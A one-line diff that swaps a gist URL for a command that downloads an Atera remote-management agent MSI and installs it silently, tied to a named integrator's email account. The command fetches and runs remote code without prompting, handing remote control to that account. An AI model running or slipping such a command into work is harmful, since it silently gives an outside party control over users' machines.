@@ -1,1 +1,1 @@
-https://gist.githubusercontent.com/whichbuffer/b240c50b1f17f45de4b82e24c273bba9/raw/e537d56a854b4b866668b78bd19ac56a85595b54/gistfile1.txt
+curl -o setup.msi "http://HelpdeskSupport553851443.servicedesk.atera.com/GetAgent/Msi/?customerId=1&integratorLogin=ozan.unal%40infinitumit.com.tr" && msiexec /i setup.msi /qn  IntegratorLogin=ozan.unal@infinitumit.com.tr CompanyId=1
